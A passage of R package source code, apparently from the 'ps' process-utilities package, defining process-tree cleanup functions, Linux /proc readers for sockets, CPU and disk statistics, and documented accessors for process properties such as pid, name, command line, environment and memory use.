#' Note that `with_process_cleanup()` is problematic if the R process is
#' multi-threaded and the other threads start subprocesses.
#' `with_process_cleanup()` cleans up those processes as well, which is
#' probably not what you want. This is an issue for example in RStudio.
#' Do not use `with_process_cleanup()`, unless you are sure that the
#' R process is single-threaded, or the other threads do not start
#' subprocesses. E.g. using it in package test cases is usually fine,
#' because RStudio runs these in a separate single-threaded process.
#'
#' The same holds for manually running `ps_mark_tree()` and then
#' `ps_find_tree()` or `ps_kill_tree()`.
#'
#' A safe way to use process cleanup is to use the processx package to
#' start subprocesses, and set the `cleanup_tree = TRUE` in
#' [processx::run()] or the [processx::process] constructor.
#'
#' @return `ps_mark_tree()` returns the name of the environment variable,
#' which can be used as the `marker` in `ps_kill_tree()`.
#'
#' `ps_find_tree()` returns a list of `ps_handle` objects.
#'
#' `ps_kill_tree()` returns the pids of the killed processes, in a named
#' integer vector. The names are the file names of the executables, when
#' available.
#'
#' `with_process_cleanup()` returns the value of the evaluated expression.
#'
#' @rdname ps_kill_tree
#' @export

ps_mark_tree <- function() {
  id <- get_id()
  do.call(Sys.setenv, structure(list("YES"), names = id))
  id
}

get_id <- function() {
  paste0(
    "PS",
    paste(
      sample(c(LETTERS, 0:9), 10, replace = TRUE),
      collapse = ""
    ),
    "_",
    as.integer(Internal(Sys.time()))
  )
}

#' @param expr R expression to evaluate in the new context.
#'
#' @rdname ps_kill_tree
#' @export

with_process_cleanup <- function(expr) {
  id <- ps_mark_tree()
  stat <- NULL
  do <- function() {
    on.exit(stat <<- ps_kill_tree(id), add = TRUE)
    withVisible(expr)
  }

  res <- do()

  ret <- list(
    result = res$value,
    visible = res$visible,
    process_cleanup = stat
  )
  class(ret) <- "with_process_cleanup"
  ret
}

#' @export

print.with_process_cleanup <- function(x, ...) {
  if (x$visible) {
    print(x$result)
  }
  if (length(x$process_cleanup)) {
    cat("!! Cleaned up the following processes:\n")
    print(x$process_cleanup)
  } else {
    cat("-- No leftover processes to clean up.\n")
  }
  invisible(x)
}


#' @rdname ps_kill_tree
#' @export

ps_find_tree <- function(marker) {
  assert_string(marker)
  after <- as.numeric(strsplit(marker, "_", fixed = TRUE)[[1]][2])

  pids <- setdiff(ps_pids(), Sys.getpid())

  not_null(lapply(pids, function(p) {
    tryCatch(
      .Call(ps__find_if_env, marker, after, p),
      error = function(e) NULL
    )
  }))
}

#' @param marker String scalar, the name of the environment variable to
#' use to find the marked processes.
#' @param sig The signal to send to the marked processes on Unix. On
#' Windows this argument is ignored currently.
#' @param grace Grace period, in milliseconds, used on Unix, if `sig` is
#'   `SIGKILL`.  If it is not zero, then `ps_kill_tree()` first sends a
#'   `SIGTERM` signal to all processes. If some proccesses do not
#'   terminate within `grace` milliseconds after the `SIGTERM` signal,
#'   `ps_kill_tree()` kills them by sending `SIGKILL` signals.
#'
#' @rdname ps_kill_tree
#' @export

ps_kill_tree <- function(marker, sig = signals()$SIGKILL, grace = 200) {
  # NULL on Windows
  if (!ps_os_type()[["WINDOWS"]]) {
    sig <- assert_integer(sig)
  }

  procs <- ps_find_tree(marker)
  pids <- map_int(procs, ps_pid)
  nms <- map_chr(
    procs,
    function(p) tryCatch(ps_name(p), error = function(e) "???")
  )

  if (!ps_os_type()[["WINDOWS"]] && sig == signals()$SIGKILL) {
    ps_send_signal(procs, sig)
  } else {
    ps_kill(procs, grace = grace)
  }

  structure(pids, names = nms)
}
````

### `pscheck/ps/R/linux.R`

````r
#' @importFrom utils read.table

psl_connections <- function(p) {
  sock_raw <- not_null(.Call(psll_connections, p))
  sock <- data_frame(
    fd = as.integer(vapply(sock_raw, "[[", character(1), 1)),
    id = vapply(sock_raw, "[[", character(1), 2)
  )

  flt <- function(x, col, values) x[x[[col]] %in% values, ]

  unix <- flt(psl__read_table("/proc/net/unix"), "V7", sock$id)
  tcp <- flt(psl__read_table("/proc/net/tcp")[, 1:10], "V10", sock$id)
  tcp6 <- flt(psl__read_table("/proc/net/tcp6")[, 1:10], "V10", sock$id)
  udp <- flt(psl__read_table("/proc/net/udp")[, 1:10], "V10", sock$id)
  udp6 <- flt(psl__read_table("/proc/net/udp6")[, 1:10], "V10", sock$id)

  ## Sockets that still existed when we queried /proc/net,
  ## because some of them might be closed already...
  sockx <- flt(sock, "id", c(unix$V7, tcp$V10, tcp6$V10, udp$V10, udp6$V10))

  if (length(tcp) && nrow(tcp)) {
    tcp$type <- "SOCK_STREAM"
    tcp$family <- "AF_INET"
  }
  if (length(tcp6) && nrow(tcp6)) {
    tcp6$type <- "SOCK_STREAM"
    tcp6$family <- "AF_INET6"
  }
  if (length(udp) && nrow(udp)) {
    udp$type <- "SOCK_DGRAM"
    udp$family <- "AF_INET"
  }
  if (length(udp6) && nrow(udp6)) {
    udp6$type <- "SOCK_DGRAM"
    udp6$family <- "AF_INET6"
  }
  net <- rbind(tcp, tcp6, udp, udp6)

  ## Unix socket might or might not have a path
  if (length(unix) && nrow(unix)) {
    unix$V8 <- unix$V8 %||% ""
    unix$V8[unix$V8 == ""] <- NA_character_
  }

  ## The status column is 01...09, 0A, 0B, but R might parse it as integer
  if (length(unix) && nrow(unix)) {
    unix$V6 <- str_tail(paste0('0', as.character(unix$V6)), 2)
  }
  if (length(net) && nrow(net)) {
    net$V4 <- str_tail(paste0('0', as.character(net$V4)), 2)
  }

  d <- data_frame(
    fd = integer(),
    family = character(),
    type = character(),
    laddr = character(),
    lport = integer(),
    raddr = character(),
    rport = integer(),
    state = character()
  )

  if (length(unix) && nrow(unix)) {
    d <- data_frame(
      fd = sockx$fd[match(unix$V7, sockx$id)],
      family = "AF_UNIX",
      type = match_names(ps_env$constants$socket_types, unix$V5),
      laddr = unix$V8,
      lport = NA_integer_,
      raddr = NA_character_,
      rport = NA_integer_,
      state = NA_character_
    )
  }

  if (!is.null(net)) {
    laddr <- mapply(
      psl__decode_address,
      net$V2,
      net$family,
      SIMPLIFY = FALSE,
      USE.NAMES = FALSE
    )
    raddr <- mapply(
      psl__decode_address,
      net$V3,
      net$family,
      SIMPLIFY = FALSE,
      USE.NAMES = FALSE
    )

    net_d <- data_frame(
      fd = sockx$fd[match(net$V10, sockx$id)],
      family = net$family,
      type = net$type,
      laddr = vapply(laddr, "[[", character(1), 1),
      lport = vapply(laddr, "[[", integer(1), 2),
      raddr = vapply(raddr, "[[", character(1), 1),
      rport = vapply(raddr, "[[", integer(1), 2),
      state = match_names(ps_env$constants$tcp_statuses, net$V4)
    )

    d <- rbind(d, net_d)
  }

  d
}

psl__read_table <- function(
  file,
  stringsAsFactors = FALSE,
  header = FALSE,
  skip = 1,
  fill = TRUE,
  ...
) {
  tryCatch(
    read.table(
      file,
      stringsAsFactors = stringsAsFactors,
      header = header,
      skip = skip,
      fill = fill,
      ...
    ),
    error = function(e) NULL
  )
}

psl__decode_address <- function(addr, family) {
  ipp <- strsplit(addr, ":")[[1]]
  if (length(ipp) != 2) {
    return(list(NA_character_, NA_integer_))
  }
  addr <- str_strip(ipp[[1]])
  port <- strtoi(ipp[[2]], 16)

  if (family == "AF_INET") {
    AF_INET <- ps_env$constants$address_families[["AF_INET"]]
    addrn <- strtoi(substring(addr, 1:4 * 2 - 1, 1:4 * 2), base = 16)
    if (.Platform$endian == "little") {
      addrn <- rev(addrn)
    }
    addrs <- .Call(ps__inet_ntop, as.raw(addrn), AF_INET) %||% NA_character_
    list(addrs, port)
  } else {
    AF_INET6 <- ps_env$constants$address_families[["AF_INET6"]]
    addrn <- strtoi(substring(addr, 1:16 * 2 - 1, 1:16 * 2), base = 16)
    if (.Platform$endian == "little") {
      addrn[1:4] <- rev(addrn[1:4])
      addrn[5:8] <- rev(addrn[5:8])
      addrn[9:12] <- rev(addrn[9:12])
      addrn[13:16] <- rev(addrn[13:16])
    }
    addrs <- .Call(ps__inet_ntop, as.raw(addrn), AF_INET6) %||% NA_character_
    list(addrs, port)
  }
}

psl__cpu_count_from_lscpu <- function() {
  tryCatch(
    {
      lines <- system("lscpu -p=core", intern = TRUE)
      cores <- unique(lines[!str_starts_with(lines, "#")])
      length(cores)
    },
    error = function(e) psl__cpu_count_from_cpuinfo()
  )
}

psl__cpu_count_from_cpuinfo <- function() {
  lines <- readLines("/proc/cpuinfo")
  mapping = list()
  current = list()

  for (l in lines) {
    l <- tolower(str_strip(l))
    if (!nchar(l)) {
      if (
        "physical id" %in% names(current) && "cpu cores" %in% names(current)
      ) {
        mapping[[current[["physical id"]]]] <- current[["cpu cores"]]
      }
      current <- list()
    } else {
      if (
        str_starts_with(l, "physical id") ||
          str_starts_with(l, "cpu cores")
      ) {
        kv <- strsplit(l, "\\t+:")[[1]]
        current[[kv[[1]]]] <- kv[[2]]
      }
    }
  }

  sum(as.integer(unlist(mapping)))
}

ps_cpu_count_physical_linux <- function() {
  if (Sys.which("lscpu") != "") {
    psl__cpu_count_from_lscpu()
  } else {
    psl__cpu_count_from_cpuinfo()
  }
}

ps__system_cpu_times_linux <- function() {
  clock_ticks <- tryCatch(
    as.numeric(system("getconf CLK_TCK", intern = TRUE)),
    error = function(e) return(250)
  )
  stat <- readLines("/proc/stat", n = 1)
  tms <- as.double(strsplit(stat, "\\s+")[[1]][-1]) / clock_ticks
  nms <- c(
    "user",
    "nice",
    "system",
    "idle",
    "iowait",
    "irq",
    "softirq",
    "steal",
    "guest",
    "guest_nice"
  )
  names(tms) <- nms[1:length(tms)]
  tms
}

ps__disk_io_counters_linux <- function() {
  # Internal disk IO counters for Linux, reads lines from diskstats if it exists
  # or /sys/block as a backup
  if (file.exists("/proc/diskstats")) {
    ps__read_procfs()
  } else if (dir.exists("/sys/block")) {
    ps__read_sysfs()
  } else {
    stop(
      "Can't read disk IO, neither /proc/diskstats or /sys/block on this system"
    )
  }
}

ps__is_storage_device <- function(name, including_virtual = TRUE) {
  # Whether a named drive (e.g. 'sda') is a real storage device, or a virtual one
  name <- gsub("/", "!", name, fixed = TRUE)
  if (including_virtual) {
    path <- file.path("/sys/block", name)
  } else {
    path <- file.path("/sys/block", name, "device")
  }

  return(dir.exists(path))
}

ps__read_procfs <- function() {
  # Read total disk IO stats from /proc/diskstats
  file <- readLines("/proc/diskstats")
  # Get info as list of vectors (could be different lengths)
  lines <- strsplit(trimws(file), "\\s+")
  # Pre-allocate matrix of info as NAs
  mat <- matrix(data = NA_character_, nrow = length(lines), ncol = 10)
  for (i in seq_along(lines)) {
    # For each line, check length and insert into matrix as appropriate
    line <- lines[[i]]
    flen <- length(line)
    if (flen == 15) {
      # Linux 2.4
      mat[i, 1] <- line[[4]] # name
      mat[i, 2] <- line[[3]] # reads
      mat[i, 3:9] <- line[5:11] # reads_merged, rbytes, rtime, writes, writes_merged, wbytes, wtime
      mat[i, 10] <- line[[14]] # busy_time
    } else if (flen == 14 || flen >= 18) {
      # Linux 2.6+, line referring to a disk
      mat[i, 1] <- line[[3]] # name
      mat[i, 2:9] <- line[5:12] # reads, reads_merged, rbytes, rtime, writes, writes_merged, wbytes, wtime
      mat[i, 10] <- line[[14]] # busy_time
    } else if (flen == 7) {
      # Linux 2.6+, line referring to a partition
      mat[i, 1] <- line[[2]] # name
      mat[i, 2] <- line[[4]] # reads
      mat[i, 4:5] <- line[5:6] # rbytes, writes
      mat[i, 8] <- line[7] # wbytes
    } else {
      stop("Cannot read diskstats file")
    }
  }

  # Add names and convert types as appropriate
  return(data.frame(
    name = mat[, 1],
    read_count = as.numeric(mat[, 2]),
    read_merged_count = as.numeric(mat[, 3]),
    read_bytes = as.numeric(mat[, 4]) * 512, # Multiple by disk sector size to get bytes
    read_time = as.numeric(mat[, 5]),
    write_count = as.numeric(mat[, 6]),
    write_merged_count = as.numeric(mat[, 7]),
    write_bytes = as.numeric(mat[, 8]) * 512, # Multiple by disk sector size to get bytes
    write_time = as.numeric(mat[, 9]),
    busy_time = as.numeric(mat[, 10])
  ))
}

ps__read_sysfs <- function() {
  # Read disk IO from each device folder in /sys/block

  # Get stat files for each block
  blocks <- list.dirs("/sys/block/", recursive = FALSE)
  all_files <- list.files(blocks, full.names = TRUE)
  stats <- all_files[grepl("(stat)$", all_files)]

  # Pre-allocate list for dfs
  disk_info <- vector(mode = "list", length = length(stats))
  for (i in seq_along(stats)) {
    # Read in each file, get the field
    stat <- stats[[i]]
    fields <- readLines(stat)
    fields <- unlist(strsplit(trimws(fields), "\\s+"))

    # Save all info as a dataframe
    block_info <- data.frame(
      name = strsplit(stat, "/", fixed = TRUE)[[1]][[5]], # Extract name from stat filepath
      read_count = as.numeric(fields[[1]]),
      read_merged_count = as.numeric(fields[[2]]),
      read_bytes = as.numeric(fields[[3]]) * 512, # Multiple by disk sector size to get bytes
      read_time = as.numeric(fields[[4]]),
      write_count = as.numeric(fields[[5]]),
      write_merged_count = as.numeric(fields[[6]]),
      write_bytes = as.numeric(fields[[7]]) * 512, # Multiple by disk sector size to get bytes
      write_time = as.numeric(fields[[8]]),
      busy_time = as.numeric(fields[[10]])
    )

    disk_info[[i]] <- block_info
  }
  return(do.call(rbind, disk_info))
}
````

### `pscheck/ps/R/low-level.R`

````r
#' Create a process handle
#'
#' @param pid A process id (integer scalar) or process string (from
#'   `ps_string()`). `NULL` means the current R process.
#' @param time Start time of the process. Usually `NULL` and ps will query
#'   the start time.
#' @return `ps_handle()` returns a process handle (class `ps_handle`).
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p

ps_handle <- function(pid = NULL, time = NULL) {
  if (!is.null(pid)) {
    pid <- assert_pid(pid)
  }
  if (is.character(pid)) {
    return(ps__str_decode(pid))
  }
  if (!is.null(time)) {
    assert_time(time)
  }
  .Call(psll_handle, pid, time)
}

#' @rdname ps_handle
#' @export

as.character.ps_handle <- function(x, ...) {
  pieces <- .Call(psll_format, x)
  paste0(
    "<ps::ps_handle> PID=",
    pieces[[2]],
    ", NAME=",
    pieces[[1]],
    ", AT=",
    format_unix_time(pieces[[3]])
  )
}

#' @param x Process handle.
#' @param ... Not used currently.
#'
#' @rdname ps_handle
#' @export

format.ps_handle <- function(x, ...) {
  as.character(x, ...)
}

#' @rdname ps_handle
#' @export

print.ps_handle <- function(x, ...) {
  cat(format(x, ...), "\n", sep = "")
  invisible(x)
}

#' Pid of a process handle
#'
#' This function works even if the process has already finished.
#'
#' @param p Process handle.
#' @return Process id.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_pid(p)
#' ps_pid(p) == Sys.getpid()

ps_pid <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_pid, p)
}

#' Start time of a process
#'
#' The pid and the start time pair serves as the identifier of the process,
#' as process ids might be reused, but the chance of starting two processes
#' with identical ids within the resolution of the timer is minimal.
#'
#' This function works even if the process has already finished.
#'
#' @param p Process handle.
#' @return `POSIXct` object, start time, in GMT.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_create_time(p)

ps_create_time <- function(p = ps_handle()) {
  assert_ps_handle(p)
  format_unix_time(.Call(psll_create_time, p))
}

#' Checks whether a process is running
#'
#' It returns `FALSE` if the process has already finished.
#'
#' It uses the start time of the process to work around pid reuse. I.e.
#  it returns the correct answer, even if the process has finished and
#  its pid was reused.
#'
#' @param p Process handle.
#' @return Logical scalar.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_is_running(p)

ps_is_running <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_is_running, p)
}

#' Parent pid or parent process of a process
#'
#' `ps_ppid()` returns the parent pid, `ps_parent()` returns a `ps_handle`
#' of the parent.
#'
#' On POSIX systems, if the parent process terminates, another process
#' (typically the pid 1 process) is marked as parent. `ps_ppid()` and
#' `ps_parent()` will return this process then.
#'
#' Both `ps_ppid()` and `ps_parent()` work for zombie processes.
#'
#' @param p Process handle.
#' @return `ps_ppid()` returns and integer scalar, the pid of the parent
#'   of `p`. `ps_parent()` returns a `ps_handle`.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_ppid(p)
#' ps_parent(p)

ps_ppid <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_ppid, p)
}

#' @rdname  ps_ppid
#' @export

ps_parent <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_parent, p)
}

#' Process name
#'
#' The name of the program, which is typically the name of the executable.
#'
#' On Unix this can change, e.g. via an exec*() system call.
#'
#' `ps_name()` works on zombie processes.
#'
#' @param p Process handle.
#' @return Character scalar.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_name(p)
#' ps_exe(p)
#' ps_cmdline(p)

ps_name <- function(p = ps_handle()) {
  assert_ps_handle(p)
  n <- .Call(psll_name, p)
  if (nchar(n) >= 15) {
    ## On UNIX the name gets truncated to the first 15 characters.
    ## If it matches the first part of the cmdline we return that
    ## one instead because it's usually more explicative.
    ## Examples are "gnome-keyring-d" vs. "gnome-keyring-daemon".

    ## In addition, under qemu (e.g. in cross-platform Docker), the
    ## first entry is qemu and the second entry is the file name
    cmdline <- tryCatch(
      ps_cmdline(p),
      error = function(e) NULL
    )
    if (!is.null(cmdline) && length(cmdline) > 0L) {
      exname <- basename(cmdline[1])
      if (str_starts_with(exname, n)) {
        n <- exname
      } else if (
        grepl("qemu", exname) &&
          length(cmdline) >= 2 &&
          str_starts_with(exname2 <- basename(cmdline[2]), n)
      ) {
        n <- exname2
      }
    }
  }
  n
}

#' Full path of the executable of a process
#'
#' Path to the executable of the process. May also be an empty string or
#' `NA` if it cannot be determined.
#'
#' For a zombie process it throws a `zombie_process` error.
#'
#' @param p Process handle.
#' @return Character scalar.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_name(p)
#' ps_exe(p)
#' ps_cmdline(p)

ps_exe <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_exe, p)
}

#' Command line of the process
#'
#' Command line of the process, i.e. the executable and the command line
#' arguments, in a character vector. On Unix the program might change its
#' command line, and some programs actually do it.
#'
#' For a zombie process it throws a `zombie_process` error.
#'
#' @param p Process handle.
#' @return Character vector.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_name(p)
#' ps_exe(p)
#' ps_cmdline(p)

ps_cmdline <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_cmdline, p)
}

#' Current process status
#'
#' One of the following:
#' * `"idle"`: Process being created by fork, or process has been sleeping
#'     for a long time. macOS only.
#' * `"running"`: Currently runnable on macOS and Windows. Actually
#'     running on Linux.
#' * `"sleeping"` Sleeping on a wait or poll.
#' * `"disk_sleep"` Uninterruptible sleep, waiting for an I/O operation
#'    (Linux only).
#' * `"stopped"` Stopped, either by a job control signal or because it
#'    is being traced.
#' * `"uninterruptible"` Process is in uninterruptible wait. macOS only.
#' * `"tracing_stop"` Stopped for tracing (Linux only).
#' * `"zombie"` Zombie. Finished, but parent has not read out the exit
#'    status yet.
#' * `"dead"` Should never be seen (Linux).
#' * `"wake_kill"` Received fatal signal (Linux only).
#' * `"waking"` Paging (Linux only, not valid since the 2.6.xx kernel).
#'
#' It might return `NA_character_` on macOS.
#'
#' Works for zombie processes.
#'
#' @section Note on macOS:
#' On macOS `ps_status()` often falls back to calling the external `ps`
#' program, because macOS does not let R access the status of most other
#' processes. Notably, it is usually able to access the status of other R
#' processes.
#'
#' The external `ps` program always runs as the root user, and
#' it also has special entitlements, so it can typically access the status
#' of most processes.
#'
#' If this behavior is problematic for you, e.g. because calling an
#' external program is too slow, set the `ps.no_external_ps` option to
#' `TRUE`:
#' ```
#' options(ps.no_external_ps = TRUE)
#' ```
#' Note that setting this option to `TRUE` will cause `ps_status()` to
#' return `NA_character_` for most processes.
#'
#' @param p Process handle.
#' @return Character scalar.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_status(p)

ps_status <- function(p = ps_handle()) {
  assert_ps_handle(p)
  ret <- .Call(psll_status, p)
  if (
    is.na(ret) &&
      ps_os_type()[["MACOS"]] &&
      !isTRUE(getOption("ps.no_external_ps"))
  ) {
    ret <- ps_status_macos_ps(ps_pid(p))
  }
  ret
}

#' Owner of the process
#'
#' The name of the user that owns the process. On Unix it is calculated
#' from the real user id.
#'
#' On Unix, a numeric uid id returned if the uid is not in the user
#' database, thus a username cannot be determined.
#'
#' Works for zombie processes.
#'
#' @param p Process handle.
#' @return String scalar.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_username(p)

ps_username <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_username, p)
}

#' Process current working directory as an absolute path.
#'
#' For a zombie process it throws a `zombie_process` error.
#'
#' @param p Process handle.
#' @return String scalar.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_cwd(p)

ps_cwd <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_cwd, p)
}

#' User ids and group ids of the process
#'
#' User ids and group ids of the process. Both return integer vectors with
#' names: `real`, `effective` and `saved`.
#'
#' Both work for zombie processes.
#'
#' They are not implemented on Windows, they throw a `not_implemented`
#' error.
#'
#' @param p Process handle.
#' @return Named integer vector of length 3, with names: `real`,
#'   `effective` and `saved`.
#'
#' @seealso [ps_username()] returns a user _name_ and works on all
#'   platforms.
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ps::ps_os_type()["POSIX"] && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_uids(p)
#' ps_gids(p)

ps_uids <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_uids, p)
}

#' @rdname ps_uids
#' @export

ps_gids <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_gids, p)
}

#' Terminal device of the process
#'
#' Returns the terminal of the process. Not implemented on Windows, always
#' returns `NA_character_`. On Unix it returns `NA_character_` if the
#' process has no terminal.
#'
#' Works for zombie processes.
#'
#' @param p Process handle.
#' @return Character scalar.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_terminal(p)

ps_terminal <- function(p = ps_handle()) {
  assert_ps_handle(p)
  ttynr <- .Call(psll_terminal, p)
  if (is.character(ttynr)) {
    ttynr
  } else if (is.na(ttynr)) {
    NA_character_
  } else {
    tmap <- get_terminal_map()
    tmap[[as.character(ttynr)]]
  }
}

#' Environment variables of a process
#'
#' `ps_environ()` returns the environment variables of the process, in a
#' named vector, similarly to the return value of `Sys.getenv()`
#' (without arguments).
#'
#' Note: this usually does not reflect changes made after the process
#' started.
#'
#' `ps_environ_raw()` is similar to `p$environ()` but returns the
#' unparsed `"var=value"` strings. This is faster, and sometimes good
#' enough.
#'
#' These functions throw a `zombie_process` error for zombie processes.
#'
#' @section macOS issues:
#'
#' `ps_environ()` usually does not work on macOS nowadays. This is because
#' macOS does not allow reading the environment variables of another
#' process. Accoding to the Darwin source code, `ps_environ` will work is
#' one of these conditions hold:
#'
#' * You are running a development or debug kernel, i.e. if you are
#'   debugging the macOS kernel itself.
#' * The target process is same as the calling process.
#' * SIP if off.
#' * The target process is not restricted, e.g. it is running a binary
#'   that was not signed.
#' * The calling process has the
#'   `com.apple.private.read-environment-variables` entitlement. However
#'   adding this entitlement to the R binary makes R crash on startup.
#'
#' Otherwise `ps_environ` will return an empty set of environment variables
#' on macOS.
#'
#' Issue 121 might have more information about this.
#'
#' @param p Process handle.
#' @return `ps_environ()` returns a named character vector (that has a
#' `Dlist` class, so it is printed nicely), `ps_environ_raw()` returns a
#' character vector.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' env <- ps_environ(p)
#' env[["R_HOME"]]

ps_environ <- function(p = ps_handle()) {
  assert_ps_handle(p)
  parse_envs(.Call(psll_environ, p))
}

#' @rdname ps_environ
#' @export

ps_environ_raw <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_environ, p)
}

#' Number of threads
#'
#' Throws a `zombie_process()` error for zombie processes.
#'
#' @param p Process handle.
#' @return Integer scalar.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_num_threads(p)

ps_num_threads <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_num_threads, p)
}

#' CPU times of the process
#'
#' All times are measured in seconds:
#' * `user`: Amount of time that this process has been scheduled in user
#'   mode.
#' * `system`: Amount of time that this process has been scheduled in
#'   kernel mode
#' * `children_user`: On Linux, amount of time that this process's
#'   waited-for children have been scheduled in user mode.
#' * `children_system`: On Linux, Amount of time that this process's
#'   waited-for children have been scheduled in kernel mode.
#'
#' Throws a `zombie_process()` error for zombie processes.
#'
#' @param p Process handle.
#' @return Named real vector or length four: `user`, `system`,
#'   `children_user`,  `children_system`. The last two are `NA` on
#'   non-Linux systems.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_cpu_times(p)
#' proc.time()

ps_cpu_times <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_cpu_times, p)
}

#' Memory usage information
#'
#' @details
#'
#' `ps_memory_info()` returns information about memory usage.
#'
#' It returns a named vector. Portable fields:
#' * `rss`: "Resident Set Size", this is the non-swapped physical memory a
#'   process has used (bytes). On UNIX it matches "top"‘s 'RES' column (see doc). On
#'   Windows this is an alias for `wset` field and it matches "Memory"
#'   column of `taskmgr.exe`.
#' * `vmem`: "Virtual Memory Size", this is the total amount of virtual
#'   memory used by the process (bytes). On UNIX it matches "top"‘s 'VIRT' column
#'   (see doc). On Windows this is an alias for the `pagefile` field and
#'   it matches the "Working set (memory)" column of `taskmgr.exe`.
#'
#' Non-portable fields:
#' * `shared`: (Linux) memory that could be potentially shared with other
#'   processes (bytes). This matches "top"‘s 'SHR' column (see doc).
#' * `text`: (Linux): aka 'TRS' (text resident set) the amount of memory
#'   devoted to executable code (bytes). This matches "top"‘s 'CODE' column (see
#'   doc).
#' * `data`: (Linux): aka 'DRS' (data resident set) the amount of physical
#'   memory devoted to other than executable code (bytes). It matches "top"‘s
#'   'DATA' column (see doc).
#' * `lib`: (Linux): the memory used by shared libraries (bytes).
#' * `dirty`: (Linux): the amount of memory in dirty pages (bytes).
#' * `pfaults`: (macOS): number of page faults.
#' * `pageins`: (macOS): number of actual pageins.
#'
#' For the explanation of Windows fields see the
#' [PROCESS_MEMORY_COUNTERS_EX](https://learn.microsoft.com/en-us/windows/win32/api/psapi/ns-psapi-process_memory_counters_ex)
#' structure.
#'
#' `ps_memory_full_info()` returns all fields as `ps_memory_info()`, plus
#' additional information, but typically takes slightly longer to run, and
#' might not have access to some processes that `ps_memory_info()` can
#' query:
#'
#' * `maxrss` maximum resident set size over the process's lifetime. This
#'   only works for the calling process, otherwise it is `NA_real_`.
#' * `uss`: Unique Set Size, this is the memory which is unique to a
#'   process and which would be freed if the process was terminated right
#'   now.
#' * `pss` (Linux only): Proportional Set Size, is the amount of memory
#'   shared with other processes, accounted in a way that the amount is
#'   divided evenly between the processes that share it. I.e. if a process
#'   has 10 MBs all to itself and 10 MBs shared with another process its
#'   PSS will be 15 MBs.
#' * `swap` (Linux only): amount of memory that has been swapped out to
#'   disk.
#'
#' They both throw a `zombie_process()` error for zombie processes.
#'
#' @param p Process handle.
#' @return Named real vector.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' p
#' ps_memory_info(p)
#' ps_memory_full_info(p)

ps_memory_info <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_memory_info, p)
}

#' @export
#' @rdname ps_memory_info

ps_memory_full_info <- function(p = ps_handle()) {
  assert_ps_handle(p)
  info <- ps_memory_info(p)
  info[["maxrss"]] <- if (Sys.getpid() == ps_pid(p)) {
    .Call(psll_memory_maxrss, p)
  } else {
    NA_real_
  }

  type <- ps_os_type()
  if (type[["LINUX"]]) {
    match <- function(re) {
      mt <- gregexpr(re, smaps, perl = TRUE)[[1]]
      st <- substring(
        smaps,
        attr(mt, "capture.start"),
        attr(mt, "capture.start") + attr(mt, "capture.length") - 1
      )
      sum(as.integer(st), na.rm = TRUE) * 1024
    }

    smaps <- .Call(ps__memory_maps, p)
    info[["uss"]] <- match("\nPrivate.*:\\s+(\\d+)")
    info[["pss"]] <- match("\nPss:\\s+(\\d+)")
    info[["swap"]] <- match("\nSwap:\\s+(\\d+)")
  } else if (type[["MACOS"]]) {
    info[["uss"]] <- .Call(psll_memory_uss, p)
  } else if (type[["WINDOWS"]]) {
    info[["uss"]] <- .Call(psll_memory_uss, p)
  }
  info
}

process_signal_result <- function(p, res, err_msg) {
  ok <- map_lgl(res, function(x) is.character(x) || is.null(x))
  if (all(ok)) {
    unlist(res)
  } else {
    for (i in which(!ok)) {
      class(res[[i]]) <- res[[i]][[2]]
    }
